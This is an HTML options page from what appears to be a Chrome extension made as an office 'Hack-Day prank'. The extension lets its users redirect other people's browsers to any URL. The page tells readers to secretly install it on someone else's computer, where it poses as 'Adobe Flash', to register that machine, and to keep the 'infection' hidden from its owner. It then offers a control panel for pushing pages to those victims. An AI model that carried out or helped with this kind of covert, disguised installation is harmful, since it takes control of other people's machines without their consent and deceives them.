  <h1>Congratulations, you've won!</h1>
  <h2>What the hell is this?</h2>
  <p>
    This is the most elaborate Hack-Day prank yet. If you've been wondering why your browser keeps mysteriously going to web pages that you haven't sent it to, now you know the answer.
  </p>
  <h2>Can I get in on the fun?</h2>
  <p>
  Yes! You are in on the fun! Below you'll find a simple interface for sending people to any website of your choosing. Evil? Yes. Deadly? No. The only catch is you <strong>must follow these 3 rules</strong>:
  </p>
  <ol>
    <li><strong>Don't talk to anyone about this!</strong> Even people on the list might not know they're infected yet.</li>
    <li>Do your best to install this extension on someone's computer. (See the instructions at the bottom of the page)</li>
    <li>Try to pace yourself. The person you're pranking is presumably trying to get work done, so don't start popping up windows every 30 seconds.</li>
  </ol>
  <h2>Controls</h2>
  <p>Find someones name in the list below, type in a URL and hit enter.</p>
  <p id="interface">If you can see this it means there was a problem. Try reloading the extension.</p>
  <h2>Installation instructions</h2>
  <ol>
    <li>On someone else's computer, open Chrome and visit <a href="http://gotherehack.com">http://gotherehack.com</a></li>
    <li>Click "Install plugin" and allow Chrome to do so when prompted</li>
    <li>Go to the Chrome Extensions page (On OS X it's in Window > Extension) and click Options under the extension that looks like "Adobe Flash"</li>
    <li>Enter the name of the person's computer your infecting when prompted</li>
    <li>Close the options tab and run!</li>
  </ol>
